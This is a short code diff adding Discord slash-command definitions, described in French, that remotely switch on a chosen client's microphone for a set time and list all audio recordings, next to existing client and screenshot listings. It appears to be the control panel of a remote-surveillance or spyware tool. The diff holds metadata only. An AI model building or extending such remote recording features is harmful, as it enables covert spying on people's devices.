@@ -21,6 +21,24 @@ export const commands = [
         ],
     },
     {
+        name: 'microphone',
+        description: 'Envoie une commande pour activer le microphone d\'un client spécifique.',
+        options: [
+            {
+                name: 'client_id',
+                description: 'Le numéro du client.',
+                type: 3,
+                required: true,
+            },
+            {
+                name: 'duration',
+                description: 'La durée de l\'enregistrement en secondes.',
+                type: 4,
+                required: true,
+            }
+        ],
+    },
+    {
         name: 'clients',
         description: 'Liste des clients.',
         options: [
@@ -49,6 +67,10 @@ export const commands = [
     {
         name: 'listallscreenshots',
         description: 'Liste de toutes les captures d\'écran.',
+    },
+    {
+        name: 'listallmicrophones',
+        description: 'Liste de tous les enregistrements audio.',
     },
 ];
 
